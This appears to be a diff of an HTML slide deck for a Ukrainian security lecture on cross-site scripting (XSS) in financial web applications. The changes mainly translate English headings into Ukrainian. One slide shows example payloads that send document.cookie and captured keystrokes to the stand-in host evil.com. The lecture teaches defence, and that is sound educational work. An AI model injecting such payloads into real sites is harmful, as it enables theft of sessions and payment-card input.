@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>4.1 Cross-Site Scripting (XSS) | Фінансова Безпека</title>
+  <title>4.1 Міжсайтовий скриптинг (XSS) | Фінансова Безпека</title>
   <link rel="icon" type="image/svg+xml" href="../../img/favicon.svg">
   <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="../../css/slides.css">
@@ -26,7 +26,7 @@
     <!-- 1. Title -->
     <section class="slide active">
       <span class="slide-icon">💉</span>
-      <h1>Cross-Site Scripting (XSS)</h1>
+      <h1>Міжсайтовий скриптинг (XSS)</h1>
       <p class="subtitle">Лекція 4.1</p>
       <span class="tag tag-red" style="margin-top: 1rem;">Найпоширеніша веб-вразливість</span>
     </section>
@@ -56,7 +56,7 @@
         </div>
         <div class="icon-list-item">
           <span class="il-icon">💳</span>
-          <span class="il-text"><strong>Keylogging</strong> — запис натискань клавіш у полях введення картки</span>
+          <span class="il-text"><strong>Перехоплення клавіш (Keylogging)</strong> — запис натискань клавіш у полях введення картки</span>
         </div>
       </div>
     </section>
@@ -67,17 +67,17 @@
       <div class="card-grid cols-3">
         <div class="card accent-orange">
           <span class="card-icon">↩️</span>
-          <div class="card-title">Reflected</div>
+          <div class="card-title">Відображений (Reflected)</div>
           <div class="card-text">Payload у URL → відображається у відповіді. Потрібне посилання</div>
         </div>
         <div class="card accent-red">
           <span class="card-icon">💾</span>
-          <div class="card-title">Stored</div>
+          <div class="card-title">Збережений (Stored)</div>
           <div class="card-text">Зберігається в БД → вражає всіх відвідувачів. Найнебезпечніший</div>
         </div>
         <div class="card accent-purple">
           <span class="card-icon">🌐</span>
-          <div class="card-title">DOM-based</div>
+          <div class="card-title">На основі DOM</div>
           <div class="card-text">Виконується в DOM без участі сервера. WAF не бачить</div>
         </div>
       </div>
@@ -88,7 +88,7 @@
 
     <!-- 4. Reflected XSS -->
     <section class="slide">
-      <h1>Reflected XSS</h1>
+      <h1>Відображений XSS (Reflected)</h1>
       <h2>Payload через URL-параметр</h2>
       <div class="steps">
         <div class="step">
@@ -119,7 +119,7 @@
 
     <!-- 5. Stored XSS -->
     <section class="slide">
-      <h1>Stored XSS — найнебезпечніший</h1>
+      <h1>Збережений XSS (Stored) — найнебезпечніший</h1>
       <h2>Payload зберігається на сервері</h2>
       <div class="icon-list">
         <div class="icon-list-item">
@@ -146,13 +146,13 @@
 
     <!-- 6. DOM-based XSS -->
     <section class="slide">
-      <h1>DOM-based XSS</h1>
-      <h2>Sources → Sinks (без участі сервера)</h2>
+      <h1>XSS на основі DOM</h1>
+      <h2>Джерела → Приймачі (без участі сервера)</h2>
       <div class="two-col">
         <div class="col">
           <div class="card accent-orange" style="height: 100%;">
             <span class="card-icon">📥</span>
-            <div class="card-title">Sources (джерела)</div>
+            <div class="card-title">Джерела (Sources)</div>
             <div class="card-text" style="margin-top: 8px; font-size: 0.95rem; line-height: 1.7;">
               location.hash<br>
               location.search<br>
@@ -165,7 +165,7 @@
         <div class="col">
           <div class="card accent-red" style="height: 100%;">
             <span class="card-icon">📤</span>
-            <div class="card-title">Sinks (приймачі)</div>
+            <div class="card-title">Приймачі (Sinks)</div>
             <div class="card-text" style="margin-top: 8px; font-size: 0.95rem; line-height: 1.7;">
               innerHTML<br>
               document.write()<br>
@@ -203,7 +203,7 @@
         </div>
         <div class="card accent-purple">
           <span class="card-icon">🔗</span>
-          <div class="card-title">URL parameter</div>
+          <div class="card-title">URL-параметр</div>
           <div class="card-text">Percent-encoding %XX</div>
         </div>
       </div>
@@ -245,7 +245,7 @@
 
     <!-- 9. Реальні фінансові XSS-кейси -->
     <section class="slide">
-      <h1>Реальні фінансові XSS-кейси</h1>
+      <h1>Реальні фінансові XSS-інциденти</h1>
       <h2>Випадки з банківського та FinTech-сектору</h2>
       <div class="icon-list">
         <div class="icon-list-item">
@@ -284,12 +284,12 @@
       <div class="card-grid">
         <div class="card accent-red">
           <span class="card-icon">🍪</span>
-          <div class="card-title">Крадіжка cookie</div>
+          <div class="card-title">Крадіжка Cookie</div>
           <div class="card-text" style="font-family: monospace; font-size: 0.8rem;">new Image().src="https://evil.com/?c="+document.cookie</div>
         </div>
         <div class="card accent-orange">
           <span class="card-icon">🔑</span>
-          <div class="card-title">Keylogger</div>
+          <div class="card-title">Кейлогер (Keylogger)</div>
           <div class="card-text" style="font-family: monospace; font-size: 0.8rem;">document.onkeypress=e=&gt;fetch('//evil.com/k?'+e.key)</div>
         </div>
         <div class="card accent-purple">
@@ -346,15 +346,15 @@
       <div class="icon-list">
         <div class="icon-list-item">
           <span class="il-icon">1️⃣</span>
-          <span class="il-text"><strong>Reflected</strong> — через URL, потрібне посилання, email-фішинг</span>
+          <span class="il-text"><strong>Відображений (Reflected)</strong> — через URL, потрібне посилання, email-фішинг</span>
         </div>
         <div class="icon-list-item">
           <span class="il-icon">2️⃣</span>
-          <span class="il-text"><strong>Stored</strong> — у БД, вражає всіх, найнебезпечніший для FinTech</span>
+          <span class="il-text"><strong>Збережений (Stored)</strong> — у БД, вражає всіх, найнебезпечніший для FinTech</span>
         </div>
         <div class="icon-list-item">
           <span class="il-icon">3️⃣</span>
-          <span class="il-text"><strong>DOM-based</strong> — без серверу, невидимий для WAF</span>
+          <span class="il-text"><strong>На основі DOM</strong> — без серверу, невидимий для WAF</span>
         </div>
         <div class="icon-list-item">
           <span class="il-icon">4️⃣</span>
